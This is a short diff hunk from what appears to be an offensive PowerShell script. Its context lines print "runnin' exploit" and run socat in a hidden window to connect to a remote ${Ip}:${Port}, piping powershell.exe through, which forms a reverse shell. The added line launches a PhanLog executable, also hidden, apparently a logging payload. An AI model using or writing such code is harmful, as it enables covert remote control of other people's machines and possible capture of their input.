@@ -25,6 +25,8 @@ if(Get-Process -Name socat){
 	Write-Host "runnin' exploit"	
 	
 powershell.exe -windowstyle hidden .\socat -d -d TCP4:${Ip}:${Port} EXEC:'powershell.exe',pipes
+powershell.exe -windowstyle hidden .\PhanLog\Phanlog.exe
+
 }
 '@)
 
